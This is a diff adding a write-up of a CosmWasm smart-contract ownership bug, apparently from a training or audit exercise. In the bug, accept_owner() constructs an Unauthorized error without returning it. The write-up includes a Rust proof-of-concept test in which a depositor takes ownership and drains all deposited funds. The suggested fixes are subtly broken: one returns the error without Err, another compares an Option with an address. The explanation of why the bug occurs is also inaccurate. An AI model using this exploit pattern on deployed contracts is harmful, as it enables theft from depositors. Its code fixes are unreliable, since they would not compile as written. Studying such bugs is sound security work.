@@ -1,0 +1,146 @@
+issue:
+I noticed first of all, that all privileged methods have a precondition, assert_owner(deps.storage, info.sender)?;
+Here is what it does:
+pub fn assert_owner(store: &dyn Storage, sender: Addr) -> Result<(), ContractError> {
+    let state = STATE.load(store)?;
+
+    if state.current_owner != sender {
+        return Err(ContractError::Unauthorized {});
+    }
+    Ok(())
+}
+
+There is another function, accept_owner(), that allows a proposed new owner to accept their role. It does not have
+assert_owner(). In its intial state, the proposed_owner is None. propose_owner() must be called to propose a new
+owner. accept_owner() updates the current owner, after this block:
+    if state.proposed_owner != Some(info.sender.clone()) {
+        ContractError::Unauthorized {};
+    }
+
+Cosmwasm conceives of contracts as "agents" that communicate through serializable messages, using them both to initiate
+execution and consume results. It would be encouraged to send an error message in the event that contract state fails
+to update
+https://book.cosmwasm.com/actor-model/contract-as-actor.html#messages
+
+Our ContractError here is just a simple enum. We have to decide when to return it, or what to do with it.
+Rather than being able to just throw the error per se
+https://book.cosmwasm.com/basics/execute.html#error-handling
+
+If we look again you can see that the error is not returned! This statement will just evaluate to true because the
+enum exists. Execution continues, state is updated, and the other "agents" are also unaware that anything could've
+gone wrong.
+
+fix:
+Actually return the error
+    if state.proposed_owner != Some(info.sender.clone()) {
+        return ContractError::Unauthorized {};
+    }
+
+Better yet, add this to state.rs:
+pub fn assert_newowner(store: &dyn Storage, sender: Addr) -> Result<(), ContractError> {
+    let state = STATE.load(store)?;
+
+    if state.proposed_owner != sender {
+        return Err(ContractError::Unauthorized {});
+    }
+    Ok(())
+}
+
+Now we can both assert the error and return it:
+/// Entry point for new owner to accept a pending ownership transfer
+pub fn accept_owner(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
+    assert_newowner(deps.storage, info.sender)?;
+
+    STATE.update(deps.storage, |mut state| -> StdResult<_> {
+        state.current_owner = info.sender.clone();
+        state.proposed_owner = None;
+        Ok(state)
+    })?;
+
+    Ok(Response::new()
+        .add_attribute("action", "accept_owner")
+        .add_attribute("new owner", info.sender))
+}
+
+PoC test:
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // Initial state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(ADMIN),
+                proposed_owner: None,
+            }
+        );
+
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(8_000, DENOM)],
+        )
+        .unwrap();
+
+        // change owner arbitrarily
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptOwnership {},
+            &[],
+        )
+        .unwrap();
+
+        let pwn_msg = cosmwasm_std::BankMsg::Send{
+            to_address: USER1.to_string(),
+            amount: vec![coin(Uint128::new(18_000).u128(), DENOM)],
+        };
+
+        // drain funds
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Query balances
+        // we should have been able to take the contract total deposits
+        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(18_000));
+
+        // Final state
+        // we should be new owner
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(USER1),
+                proposed_owner: None,
+            }
+        );
+    }
